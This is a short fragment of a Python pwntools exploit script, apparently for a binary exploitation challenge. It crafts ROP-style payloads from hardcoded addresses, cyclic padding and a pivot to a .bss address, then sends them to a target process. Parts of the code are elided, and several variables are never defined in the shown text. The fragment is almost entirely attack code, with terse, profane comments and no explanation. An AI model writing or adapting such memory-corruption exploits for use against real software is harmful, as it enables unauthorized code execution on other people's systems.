...
def inject_toxic_feild():
    ...
    toxic_feild += p64(0x404e20 + 0xd)
    toxic_feild += p64(0x40112a)

    toxic_feild += cyclic(0xc6 - 0x18 - 4 + 7  - (8 * 2) - sall - 16) 
...
def exploit():
    ...
    total_injectable = bss - 32 + (0xe00 - 0xc6)+ sall          # these are not the toxic feild, its shifted a bit to fucking save another address
                                                # real toxic feild will be in inject toxic feild
    # badtrip 0x4043a0
    pp.sendline(cyclic(13) + p64(total_injectable  - 8 + 0xd) + p64(main_stub))
    payload = cyclic(13) + p64(bss - 8 + (0xe00 - 0xc6)) + p64(ret) + p64(0x401020) 
